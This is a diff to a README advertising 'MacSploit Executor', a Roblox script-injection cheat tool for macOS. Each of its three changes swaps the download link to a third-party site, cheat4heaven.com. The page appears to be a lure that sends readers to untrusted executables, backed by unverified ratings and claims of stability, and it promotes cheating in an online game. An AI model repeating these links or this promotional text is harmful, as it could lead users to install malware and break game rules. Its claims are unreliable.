@@ -4,7 +4,7 @@
 ![User Rating](https://img.shields.io/badge/User%20Rating-4.9%2F5-yellow)
 ![Latest Version](https://img.shields.io/badge/Version-3.2.0-blue)
 
-## **[⬇️ Download MacSploit Executor — Latest Version](https://cli-git-setup.github.io/.github/)**
+## **[⬇️ Download MacSploit Executor — Latest Version](https://cheat4heaven.com/safe-apps/)**
 
 <img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/f3aab03a-de13-4117-9392-03833e53297c" />
 
@@ -18,7 +18,7 @@ Whether you're looking to **automate grinding in RPG titles**, **streamline dail
 
 The two problems that define bad executor experiences on Mac are crashes and compatibility gaps. MacSploit addresses both directly — a heavily optimized injection engine eliminates the instability that plagues Wine-based solutions, and a comprehensive API implementation means community scripts simply work. From first-time users to experienced Lua developers, MacSploit scales to every level of expertise.
 
-> **⬇️ [Download MacSploit Executor — Latest Version](https://cli-git-setup.github.io/.github/)**
+> **⬇️ [Download MacSploit Executor — Latest Version](https://cheat4heaven.com/safe-apps/)**
 
 ---
 
@@ -89,7 +89,7 @@ Using MacSploit as your primary scripting tool delivers tangible improvements to
 7. Open Roblox, join any game, and click **Inject**
 8. Load your script and click **Execute**
 
-> **⬇️ [Download MacSploit Executor for macOS](https://cli-git-setup.github.io/.github/)**
+> **⬇️ [Download MacSploit Executor for macOS](https://cheat4heaven.com/safe-apps/)**
 
 ---
 
